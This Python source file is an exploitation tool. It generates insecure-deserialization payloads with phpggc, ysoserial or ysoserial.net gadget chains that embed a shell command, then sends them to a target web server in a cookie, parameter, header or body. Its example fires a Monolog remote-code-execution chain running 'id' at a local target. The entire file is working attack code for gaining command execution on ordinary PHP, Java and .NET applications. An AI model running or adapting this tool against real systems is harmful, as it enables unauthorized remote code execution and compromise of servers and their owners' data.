import subprocess
import requests
import base64
from urllib.parse import quote_plus


def generate_payload(
    tool: str, gadget: str, command: str, tool_path: str = None
) -> bytes:
    """
    Generalized payload generator for tools like ysoserial, phpggc, etc.

    Args:
        tool (str): Tool name ('phpggc', 'ysoserial', etc.)
        gadget (str): Gadget chain to use
        command (str): Command to embed in the payload
        tool_path (str): Path to the tool binary/script (optional)

    Returns:
        bytes: Raw serialized payload
    """
    cmd = []

    if tool.lower() == "phpggc":
        binary = tool_path or "phpggc/phpggc"
        cmd = ["php", binary, gadget, command]

    elif tool.lower() == "ysoserial":
        binary = tool_path or "ysoserial.jar"
        cmd = ["java", "-jar", binary, gadget, command]

    elif tool.lower() == "ysoserial.net":
        binary = tool_path or "ysoserial.net.exe"
        cmd = [binary, gadget, command]

    else:
        raise ValueError(f"Unsupported tool: {tool}")

    try:
        result = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Payload generation failed: {e.stderr.decode()}")


def send_payload(
    target_url: str,
    payload: bytes,
    location: str = "cookie",
    key: str = "auth",
    encode: str = "base64",
    method: str = "GET",
    headers: dict = None,
    params: dict = None,
    data: dict = None,
):
    """
    Sends the payload to a remote server via header, cookie, param, or body.

    Args:
        target_url (str): Full URL of the target
        payload (bytes): Raw payload
        location (str): One of 'cookie', 'param', 'header', 'body'
        key (str): Parameter or header name to use
        encode (str): 'base64', 'url', or 'none'
        method (str): HTTP method (GET or POST)
        headers (dict): Additional headers
        params (dict): Additional GET params
        data (dict): Additional POST data
    """
    if encode == "base64":
        payload = base64.b64encode(payload).decode()
    elif encode == "url":
        payload = quote_plus(payload.decode())
    elif encode == "none":
        payload = payload.decode(errors="replace")

    headers = headers or {}
    params = params or {}
    data = data or {}
    cookies = {}

    if location == "cookie":
        cookies[key] = payload
    elif location == "param":
        params[key] = payload
    elif location == "header":
        headers[key] = payload
    elif location == "body":
        data[key] = payload
    else:
        raise ValueError(f"Unsupported location: {location}")

    response = requests.request(
        method, target_url, headers=headers, cookies=cookies, params=params, data=data
    )
    print(f"[+] Response status: {response.status_code}")
    print(response.text)


if __name__ == "__main__":
    # EXAMPLE USAGE:
    payload = generate_payload(tool="phpggc", gadget="monolog/rce1", command="id")
    send_payload(
        target_url="http://target.local/",
        payload=payload,
        location="cookie",
        key="auth",
        encode="base64",
        method="GET",
    )
